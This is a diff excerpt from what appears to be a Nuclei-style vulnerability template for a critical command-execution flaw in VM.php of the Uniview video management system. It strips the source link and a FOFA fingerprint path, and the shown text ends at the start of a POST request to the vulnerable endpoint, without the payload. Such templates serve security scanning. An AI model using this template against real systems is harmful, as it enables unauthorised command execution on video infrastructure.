@@ -3,12 +3,8 @@ info:
   name: 浙江宇视视频管理系统 VM.php存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sv8s8013cz23lbxg'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sv8s8013cz23lbxg
-    fofa: /Script/Public/Language.js.php
 http:
 - raw:
   - 'POST /Interface/DevManage/VM.php HTTP/1.1
